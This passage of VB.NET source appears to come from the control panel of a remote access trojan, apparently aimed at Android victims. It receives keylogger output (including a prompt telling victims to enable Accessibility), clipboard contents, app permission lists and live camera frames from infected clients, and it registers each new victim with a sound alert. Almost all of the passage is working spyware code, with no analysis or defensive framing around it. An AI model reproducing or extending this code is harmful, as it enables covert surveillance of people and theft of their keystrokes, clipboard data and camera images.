                             End Try
                         Case SecurityKey.Keylogger
                             Try
                                 Dim SPL As String() = Codes.Encoding().GetString(SPLByte.GetValue(0)).Split({Data.SPL_ARRAY}, StringSplitOptions.None)
                                 Dim handle As String = "Keylogger_" & ClassClient.ClientRemoteAddress
                                 Dim keylogg As Keylogger = My.Application.OpenForms(handle)
                                 Dim flag As Integer = -1
                                 Dim dataarry As String() = SPL(1).Split("|")
                                 Dim is_on As String = dataarry(0)
                                 Dim Allnames As String() = Nothing
                                 Try
                                    Allnames = dataarry(1).Split("*")
                                Catch ex As Exception
                                 End Try
                                 If is_on = "true" Then
                                     flag = 1
                                 ElseIf is_on = "false" Then
                                     flag = 0
                                 Else
                                     flag = 1
                                 End If
                                 If ClassClient.Keylogg = True Then
                                     If keylogg Is Nothing Then
                                         keylogg = New Keylogger
                                         keylogg.Name = handle
                                         keylogg.Title = String.Format("{0} - IP:{1}", "Keylogger", ClassClient.ClientAddressIP)
                                         keylogg.Client = Client
                                          keylogg.classClient = ClassClient
                                         keylogg.DGV0.Columns(3).Width = reso.IconsSize
                                         keylogg.DGV0.Columns(3).DisplayIndex = 0
                                         keylogg.tmpAddressIP = ClassClient.ClientAddressIP
                                         keylogg.tmpClientName = ClassClient.ClientName
                                         keylogg.tmpCountry = ClassClient.Country
                                         keylogg.tmpFolderUSER = ClassClient.FolderUSER
                                         DirectCast(keylogg, Control).Show()
                                     End If
                                 End If
                                 If keylogg IsNot Nothing Then
                                     If flag = 0 Then
                                         Dim state As String = "Enable Accessibility go to : Settings --> Accessibility"
                                         Dim getPath As String = reso.res_Path & "\Icons\FillEllipse\" & "NA" & ".png"
                                         keylogg.DGV0.Rows.Add(state, "", "", reso.GetEllImage(0, {getPath, 15, 15, 17, 17}))
                                            keylogg.IsActive = False
                                     ElseIf flag = 1 Then
                                        keylogg.IsActive = True
                                        Try
                                            If Allnames.Length > 0 Then
                                                keylogg.combologs.Items.Clear()
                                                For Each name In Allnames
                                                    keylogg.combologs.Items.Add(Codes.BSDE(name.Replace("log-", "").Replace(".txt", "")))
                                                Next
                                            End If
                                        Catch ex As Exception
                                         End Try
                                        End If
                                     If SPL.Length > 2 Then
                                            Dim arryiconandkey As String() = SPL(3).Replace("<0>", "|").Split("|")
                                        Dim appicon As Image
                                         Dim state As String = Codes.AccessibilityEvent(CInt(arryiconandkey(0)))
                                         If state = "n/a" Then state = "NA"
                                         Dim getPath As String = reso.res_Path & "\Icons\FillEllipse\" & state & ".png"
                                         If Not arryiconandkey(1) = "null" Then
                                             appicon = ResizeImage(New Bitmap(Codes.Base64ToImage(arryiconandkey(1))), New Size(45, 45))
                                        Else
                                            appicon = reso.GetEllImage(0, {getPath, 15, 15, 17, 17})
                                        End If
                                         Dim id As Integer = keylogg.DGV0.Rows.Add(state, SPL(1), SPL(2), appicon)
                                         Try
                                            If keylogg.DGV0.Rows(id).Displayed Then
                                                If keylogg.DGV0.FirstDisplayedScrollingRowIndex >= 0 Then
                                                    keylogg.DGV0.FirstDisplayedScrollingRowIndex = keylogg.DGV0.RowCount - 1
                                                    keylogg.DGV0.CurrentCell = keylogg.DGV0.Rows(keylogg.DGV0.RowCount - 1).Cells(1)
                                                    keylogg.DGV0.Rows(keylogg.DGV0.RowCount - 1).Selected = True
                                                End If
                                            End If
                                        Catch ex As Exception
                                        End Try
                                     End If
                                 End If
                             Catch ex As Exception
                             End Try
                         Case SecurityKey.AppsProperties
                             Try
                                 Dim SPL As String() = Codes.Encoding().GetString(SPLByte.GetValue(1)).Split({SPL_DATA}, StringSplitOptions.None)
                                 Dim SPL_lines As String() = SPL(1).Split({SPL_LINE}, StringSplitOptions.RemoveEmptyEntries)
                                 Dim SPLArry As String() = SPL_lines(0).Split({Data.SPL_ARRAY}, StringSplitOptions.RemoveEmptyEntries)
                                 Dim handle As String = "Properties_" & ClassClient.ClientRemoteAddress & "_" & SPLArry(1)
                                 Dim AppsProperties As AppsProperties = My.Application.OpenForms(handle)
                                 If AppsProperties Is Nothing Then
                                     AppsProperties = New AppsProperties
                                     AppsProperties.Name = handle
                                     AppsProperties.Title = String.Format("{0} - IP:{1}", "Properties", ClassClient.ClientAddressIP)
                                     DirectCast(AppsProperties, Control).Show()
                                     AppsProperties.LAppName.Text = SPLArry(0)
                                     AppsProperties.BoxIcons.Tag = SPLArry(1)
                                     Dim image = System.Drawing.Image.FromStream(New IO.MemoryStream(Convert.FromBase64String(SPLArry(2))))
                                     AppsProperties.BoxIcons.Image = image
                                     AppsProperties.LAppFlag.Text = SPLArry(3)
                                     AppsProperties.LAppInstallTime.Text = SPLArry(4)
                                     SPLArry = SPL_lines(1).Split({Data.SPL_ARRAY}, StringSplitOptions.RemoveEmptyEntries)
                                     Dim c0 As Control = AppsProperties.BOXPNL1.Controls(0)
                                     Dim c1 As Control = AppsProperties.BOXPNL1.Controls(1)
                                     Dim c2 As Control = AppsProperties.BOXPNL1.Controls(2)
                                     Dim c3 As Control = AppsProperties.BOXPNL1.Controls(3)
                                     Dim c4 As Control = AppsProperties.BOXPNL1.Controls(4)
                                     AppsProperties.BOXPNL1.Controls.Clear()
                                     For Each Permissions In SPLArry
                                         Dim lab As New Label
                                         lab.Dock = System.Windows.Forms.DockStyle.Top
                                         lab.Text = Permissions
                                         lab.TextAlign = System.Drawing.ContentAlignment.MiddleCenter
                                         lab.ForeColor = SpySettings.DefaultColor_Foreground
                                         lab.BackColor = SpySettings.DefaultColor_Background
                                         AppsProperties.BOXPNL1.Controls.Add(lab)
                                         Application.DoEvents()
                                     Next
                                     AppsProperties.BOXPNL1.Controls.Add(c0)
                                     AppsProperties.BOXPNL1.Controls.Add(c1)
                                     AppsProperties.BOXPNL1.Controls.Add(c2)
                                     AppsProperties.BOXPNL1.Controls.Add(c3)
                                     AppsProperties.BOXPNL1.Controls.Add(c4)
                                 End If
                             Catch ex As Exception
                             End Try
                         Case SecurityKey.getClipboard
                             Try
                                Dim SPL As String() = Codes.Encoding().GetString(SPLByte.GetValue(1)).Split({SPL_DATA}, StringSplitOptions.None)
                                 Dim handle As String = "Clipboard_Manager_" & ClassClient.ClientRemoteAddress
                                 Dim ClipboardManager As ClipboardManager = My.Application.OpenForms(handle)
                                 If ClipboardManager Is Nothing Then
                                     ClipboardManager = New ClipboardManager
                                     ClipboardManager.Name = handle
                                     ClipboardManager.Title = String.Format("{0} - IP:{1}", "Clipboard", ClassClient.ClientAddressIP)
                                     ClipboardManager.Client = Client
                                     ClipboardManager.classClient = ClassClient
                                     DirectCast(ClipboardManager, Control).Show()
                                 End If
                                 ClipboardManager.BoxClipboard.Text = SPL(1)
                            Catch ex As Exception
                             End Try
                         Case SecurityKey.acquire
                             Dim SPL As String() = Codes.Encoding().GetString(SPLByte.GetValue(0)).Split({SPL_ARRAY}, StringSplitOptions.None)
                             ClassClient.power = If(SPL(1) = "power", True, False) ' power | release
                             Dim obj_Upd As Object() = {Client, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".info" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.getUpdate & sockets.Data.SPL_SOCKET & "update", Codes.Encoding().GetBytes("null"), ClassClient}
                             ClassClient.SendAsync(obj_Upd)
                         Case Else
                             Try
                                 If Not ClassClient Is Nothing Then
                                     Dim objs As Object() = {Client, SecurityKey.KeysClient5 & sockets.Data.SPL_SOCKET & "10000", Codes.Encoding().GetBytes("null"), ClassClient}
                                     ClassClient.Card = Nothing
                                  End If
                             Catch skip As Exception
                             End Try
                     End Select
                  End If
             End If
         End Sub
                                          Private Shared Sub SaveVideo(thumbs As String, Filename As String, img As Image)
            If Not Directory.Exists(thumbs + "\" + Filename.Replace(".mp4", "")) Then
                Directory.CreateDirectory(thumbs + "\" + Filename.Replace(".mp4", ""))
             End If
            img.Save(thumbs + "\" + Filename.Replace(".mp4", "") + "\" + Filename.Replace(".mp4", CStr(System.DateTime.Now().Millisecond) + ".jpg"))
        End Sub
         Private Shared Sub StartCamer(classClient As Client, encodString As String, sPLByte As Array, client As TcpClient)
             Try
                 If classClient.qit = True Then
                     Return
                 End If
                 Dim SPL As String() = encodString.Split({SPL_ARRAY}, StringSplitOptions.None)
                 Dim ob As Object() = Data.GetCollection(SPL(1), classClient)
                 Dim handle As String = "Camera_Manager_" & DirectCast(ob(0), sockets.Client).ClientRemoteAddress
                 Dim CameraManager As CameraManager = My.Application.OpenForms(handle)
                 If CameraManager Is Nothing Then
                    classClient.Close(client, "")
                    Return
                Else
                        If Not CameraManager.Changed Then
                        CameraManager.Changed = True
                           CameraManager.tmpFolderUSER = CameraManager.classClient.FolderUSER
                           CameraManager.CameraClient = client
                         CameraManager.classCamera = classClient
                        CameraManager.statustext.Text = "Connected - " + CameraManager.SelectedCamera
                     End If
                  End If
                 Dim Byte_ As Byte() = DirectCast(sPLByte.GetValue(1), Byte())
                 Dim MS As New IO.MemoryStream(Byte_)
                 Dim bmp As Bitmap = Image.FromStream(MS)
                CameraManager.CAM0.Image = Codes.AddWatermark(CameraManager.RotateFlip(bmp), "© t.me/evlfdev")
                CameraManager.FPSTMP += 1
                 CameraManager.SizeFrame = reso.BytesConverter(Byte_.Length)
             Catch ex As Exception
             End Try
        End Sub
         Private Shared Function Search(ByVal value As String, ByVal grDataGrid As DataGridView) As DataGridViewCell()
            Try
                Dim DGVC As DataGridViewCell() = (From row As DataGridViewRow In grDataGrid.Rows From cell As DataGridViewCell In row.Cells Select cell Where cell.Tag = value).ToArray
                Return DGVC
            Catch ex As Exception
                Return Nothing
            End Try
        End Function
                              Public Shared Function AddCard(ByVal ParametersUUID As String, Clasclient As Client) As Object()
             Dim flag As Boolean = False
             If Not DirectCast(Data.angelform, Windows.Forms.Control).IsDisposed Then
                 If SpySettings.vRemoving_Duplicates = "Yes" Then
                  End If
                     If Not OLDCARD(ParametersUUID) Then
                    Dim CARD As ClientCard = New ClientCard(Clasclient)
                    CARD.Margin = New Padding(10)
                    angelform.clientsflow.Controls.Add(CARD)
                    Clasclient.Card = CARD
                Else
                    flag = True
                End If
                If Not flag Then
                     If SpySettings.NOTI_SOUND Then
                         If Notif_Sound.multi Then
                             If IO.File.Exists(Notif_Sound.path_File) Then
                                 Try
                                     Notif_Sound.Snds.AddSound(reso.nameRAT & CStr(Notif_Sound.id), Notif_Sound.path_File)
                                     Notif_Sound.Snds.Play(reso.nameRAT & CStr(Notif_Sound.id))
                                     Notif_Sound.id += 1
                                 Catch ex As Exception
                                 End Try
                             End If
                         Else
                             If IO.File.Exists(Notif_Sound.path_File) Then
                                 If Notif_Sound.aMedia.IsLoadCompleted Then
                                     Try
                                        Notif_Sound.aMedia.Play()
                                    Catch ex As InvalidOperationException
                                     End Try
                                 End If
                             End If
                         End If
                     End If
                 End If
                 Return {Clasclient.Card, flag}
             End If
             Return {Nothing, flag}
         End Function
         Public Shared Function GetOldCard(UUID As String) As ClientCard
            For Each r As ClientCard In Data.angelform.clientsflow.Controls
                 Try
                    If r.Tag = UUID Then
                         Return r
                     End If
                Catch ex As Exception
                 End Try
            Next
            Return Nothing
        End Function
         Public Shared Function OLDCARD(UUID As String)
            For Each r As ClientCard In angelform.clientsflow.Controls
                 Try
                    If r.Tag = UUID Then
                        Return True
                     End If
                Catch ex As Exception
                 End Try
            Next
            Return False
        End Function
         Public Shared Function GetCollection(ByVal ID As String, ByVal cli As Client) As Object()
             Dim obj As Object()
             Try
                 obj = DirectCast(cli.mysocket.ClientsOnline.Item(ID), Object())
             Catch ex As Exception
                 obj = {Nothing, Nothing}
             End Try
             Return obj
         End Function
         Public Shared Function Effect(ByVal img As Image) As Image
             Return img
         End Function
     End Class
End Namespace